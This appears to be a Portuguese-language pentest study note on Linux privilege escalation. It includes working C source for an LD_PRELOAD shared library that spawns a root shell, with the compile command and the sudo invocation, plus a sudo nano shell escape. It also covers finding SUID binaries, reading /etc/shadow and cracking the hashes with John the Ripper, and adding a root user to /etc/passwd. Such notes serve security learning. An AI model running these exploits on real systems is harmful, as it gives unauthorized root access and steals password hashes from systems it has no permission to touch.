---
tags:
  - EXPLOITATION
  - Linux
---
# Sudo

Podemos usar um *hack* para vazar informações aproveitando uma função do aplicativo. Como você pode ver abaixo, o **Apache2** tem uma opção que *suporta o carregamento de arquivos de configuração alternativos* (`-f` : especifique um ServerConfigFile alternativo).
![[Pasted image 20231218210157.png]]

Em alguns sistemas, você pode ver a opção de ambiente LD_PRELOAD

![[Pasted image 20231218210836.png]]

`LD_PRELOAD` é uma função que *permite que qualquer programa use bibliotecas compartilhadas*.  Se a opção `env_keep` estiver ativada, poderemos gerar uma biblioteca compartilhada que será carregada e executada antes da execução do programa. Observe que a opção `LD_PRELOAD` será ignorada se a ID de usuário real for diferente da ID de usuário efetiva.

As etapas desse vetor de escalonamento de privilégios podem ser resumidas da seguinte forma;

- Verificar se há LD_PRELOAD (com a opção `env_keep`)
- Escreva um código C simples compilado como um arquivo de objeto compartilhado (extensão .so)
- Executar o programa com direitos sudo e a opção LD_PRELOAD apontando para o nosso arquivo .so

O código C simplesmente gerará um shell raiz e pode ser escrito da seguinte forma:
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

Podemos salvar esse código como shell.c e compilá-lo usando o gcc em um arquivo de objeto compartilhado usando os seguintes parâmetros;
```shell]
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

![[Pasted image 20231218213144.png]]

Agora podemos usar esse arquivo de objeto compartilhado ao iniciar qualquer programa que nosso usuário possa executar com o sudo. No nosso caso, o Apache2, o find ou quase todos os programas que podemos executar com o sudo podem ser usados.

Precisamos executar o programa especificando a opção LD_PRELOAD, como segue;

```shell
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```

Isso resultará em um shell com privilégios de root.

![[Pasted image 20231218213231.png]]

### nano
Quando o usuário tem acesso ao `nano` mas não tem como salvar o arquivo, voltamos à raiz por meio de `cd/` e executamos o comando `id`, podemos ver que também não temos acesso à raiz.

Execute `sudo nano` e pressione `CTRL+R` e `CTRL+X`. Digite o seguinte comando para obter acesso root:  
```shell
reset; bash 1>&0 2>&0
```
Depois pressione Enter.

gain root access: reset; bash 1>&0 2>&0 and press Enter.
Linux PrivEsc
![[Pasted image 20231218232707.png]]

Quando executamos o comando id agora, podemos ver que temos acesso root.

![[Pasted image 20231218232732.png]]


# SUDI

Grande parte dos controles de privilégios do Linux depende do *controle das interações entre usuários e arquivos*. Isso é feito com **permissões** . Elas são concedidas aos usuários dentro de seus **níveis de privilégio**. Isso muda com o **SUID** (Set-user Identification) e o **SGID** (Set-group Identification). Elas permitem que os arquivos sejam executados com o nível de permissão do proprietário do arquivo ou do proprietário do grupo, respectivamente.

```shell
find / -type f -perm -04000 -ls 2>/dev/null
```

![[Pasted image 20231219235143.png]]

O bit SUID definido para o editor de texto nano nos permite criar, editar e ler arquivos usando o privilégio do proprietário do arquivo. O Nano é de propriedade do root, o que provavelmente significa que podemos ler e editar arquivos em um nível de privilégio mais alto do que o do nosso usuário atual. 

Nesse estágio, temos duas opções básicas para o aumento de privilégios: 
- Ler o arquivo `/etc/shadow` ou adicionar nosso usuário ao `/etc/passwd`.


### Leitura do arquivo `/etc/shadow`

Vamos dar um exemplo: O editor de texto nano tem o bit SUID definido ao executar o comando `find / -type f -perm -04000 -ls 2>/dev/null`.

nano `/etc/shadow` imprimirá o conteúdo do arquivo `/etc/shadow`. Podemos usar a ferramenta `unshadow` para criar um arquivo que possa ser violado pelo John the Ripper. Para isso, o `unshadow` precisa dos arquivos `/etc/shadow` e `/etc/passwd`.

![[Pasted image 20231220001452.png]]

```shell
unshadow passwd.txt shadow.txt > passwords.txt
```

![[Pasted image 20231220001525.png]]

## Adicionar um novo usuário com privilégios de root. 

Precisaremos do valor de hash da senha que queremos que o novo usuário tenha. Isso pode ser feito rapidamente usando a ferramenta openssl no Kali Linux.

![[Pasted image 20231220001550.png]]

Em seguida, adicionaremos essa senha com um nome de usuário ao arquivo /etc/passwd.

![[Pasted image 20231220001605.png]]

Depois que nosso usuário for adicionado (observe como root:/bin/bash foi usado para fornecer um shell de root), precisaremos mudar para esse usuário e, com sorte, teremos privilégios de root.

![[Pasted image 20231220001629.png]]

